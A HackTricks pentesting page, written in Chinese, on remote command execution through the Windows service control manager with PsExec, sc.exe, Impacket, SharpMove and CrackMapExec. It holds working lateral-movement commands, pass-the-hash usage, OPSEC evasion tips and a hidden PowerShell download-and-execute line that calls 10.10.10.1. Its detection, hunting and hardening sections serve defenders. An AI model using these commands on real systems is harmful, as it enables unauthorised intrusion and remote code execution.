# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## 它们是如何工作的

这些技术通过 SMB/RPC 远程滥用 Windows 服务控制管理器 (SCM) 在目标主机上执行命令。常见流程如下：

1. 通过 SMB (TCP/445) 认证到目标并访问 ADMIN$ 共享。
2. 复制可执行文件或指定服务将运行的 LOLBAS 命令行。
3. 通过 SCM (MS-SCMR over \PIPE\svcctl) 远程创建一个指向该命令或二进制文件的服务。
4. 启动服务以执行有效载荷，并可选择通过命名管道捕获 stdin/stdout。
5. 停止服务并清理（删除服务和任何丢弃的二进制文件）。

要求/前提条件：
- 目标上的本地管理员 (SeCreateServicePrivilege) 或目标上的显式服务创建权限。
- 可访问 SMB (445) 和可用的 ADMIN$ 共享；通过主机防火墙允许远程服务管理。
- UAC 远程限制：使用本地帐户时，令牌过滤可能会阻止网络上的管理员访问，除非使用内置管理员或 LocalAccountTokenFilterPolicy=1。
- Kerberos 与 NTLM：使用主机名/FQDN 启用 Kerberos；通过 IP 连接通常会回退到 NTLM（并可能在加固环境中被阻止）。

### 通过 sc.exe 手动 ScExec/WinExec

以下展示了一种最小的服务创建方法。服务映像可以是丢弃的 EXE 或像 cmd.exe 或 powershell.exe 这样的 LOLBAS。
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
注意：
- 启动非服务 EXE 时，预计会出现超时错误；执行仍然会发生。
- 为了保持更好的 OPSEC，建议使用无文件命令（cmd /c, powershell -enc）或删除已丢弃的工件。

在此处找到更详细的步骤： https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/

## 工具和示例

### Sysinternals PsExec.exe

- 经典的管理工具，使用 SMB 在 ADMIN$ 中丢弃 PSEXESVC.exe，安装一个临时服务（默认名称 PSEXESVC），并通过命名管道代理 I/O。
- 示例用法：
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- 您可以通过 WebDAV 直接从 Sysinternals Live 启动：
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- 留下服务安装/卸载事件（服务名称通常为 PSEXESVC，除非使用 -r），并在执行期间创建 C:\Windows\PSEXESVC.exe。

### Impacket psexec.py (类似 PsExec)

- 使用嵌入式 RemCom 类似服务。通过 ADMIN$ 投放一个临时服务二进制文件（通常是随机名称），创建一个服务（默认通常为 RemComSvc），并通过命名管道代理 I/O。
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artifacts
- 临时 EXE 在 C:\Windows\ (随机 8 个字符)。服务名称默认为 RemComSvc，除非被覆盖。

### Impacket smbexec.py (SMBExec)

- 创建一个临时服务，生成 cmd.exe 并使用命名管道进行 I/O。通常避免放置完整的 EXE 有效载荷；命令执行是半交互式的。
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral 和 SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) 实现了几种横向移动方法，包括基于服务的执行。
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) 包括服务修改/创建以远程执行命令。
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- 您还可以使用 CrackMapExec 通过不同的后端（psexec/smbexec/wmiexec）执行：
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, detection and artifacts

使用类似PsExec技术时的典型主机/网络伪影：
- 针对所用管理员帐户的安全4624（登录类型3）和4672（特殊权限）。
- 安全5140/5145文件共享和文件共享详细事件显示ADMIN$访问和服务二进制文件的创建/写入（例如，PSEXESVC.exe或随机8字符的.exe）。
- 目标上的安全7045服务安装：服务名称如PSEXESVC、RemComSvc或自定义（-r / -service-name）。
- Sysmon 1（进程创建）用于services.exe或服务映像，3（网络连接），11（文件创建）在C:\Windows\中，17/18（管道创建/连接）用于管道，如\\.\pipe\psexesvc、\\.\pipe\remcom_*或随机等效项。
- Sysinternals EULA的注册表伪影：HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1在操作员主机上（如果未被抑制）。

狩猎思路
- 当ImagePath包含cmd.exe /c、powershell.exe或TEMP位置时，对服务安装发出警报。
- 查找父映像为C:\Windows\PSEXESVC.exe或作为LOCAL SYSTEM运行的services.exe子进程的进程创建。
- 标记以-stdin/-stdout/-stderr结尾的命名管道或知名的PsExec克隆管道名称。

## Troubleshooting common failures
- 创建服务时访问被拒绝（5）：不是实际的本地管理员，UAC对本地帐户的远程限制，或EDR对服务二进制路径的篡改保护。
- 网络路径未找到（53）或无法连接到ADMIN$：防火墙阻止SMB/RPC或管理员共享被禁用。
- Kerberos失败但NTLM被阻止：使用主机名/FQDN连接（而不是IP），确保正确的SPN，或在使用Impacket时提供-k/-no-pass和票证。
- 服务启动超时但有效载荷已运行：如果不是实际的服务二进制文件则是预期的；将输出捕获到文件或使用smbexec进行实时I/O。

## Hardening notes (modern changes)
- Windows 11 24H2和Windows Server 2025默认要求出站（以及Windows 11入站）连接的SMB签名。这不会破坏使用有效凭据的合法PsExec使用，但会防止未签名的SMB中继滥用，并可能影响不支持签名的设备。
- 新的SMB客户端NTLM阻止（Windows 11 24H2/Server 2025）可以在通过IP连接或连接到非Kerberos服务器时防止NTLM回退。在强化环境中，这将破坏基于NTLM的PsExec/SMBExec；如果确实需要，请使用Kerberos（主机名/FQDN）或配置例外。
- 最小权限原则：最小化本地管理员成员资格，优先使用及时/足够管理员，强制执行LAPS，并监控/警报7045服务安装。

## See also

- 基于WMI的远程执行（通常更无文件）：
{{#ref}}
./wmiexec.md
{{#endref}}

- 基于WinRM的远程执行：
{{#ref}}
./winrm.md
{{#endref}}



## References

- PsExec - Sysinternals | Microsoft Learn: https://learn.microsoft.com/sysinternals/downloads/psexec
- Windows Server 2025和Windows 11中的SMB安全强化（默认签名，NTLM阻止）：https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591
{{#include ../../banners/hacktricks-training.md}}
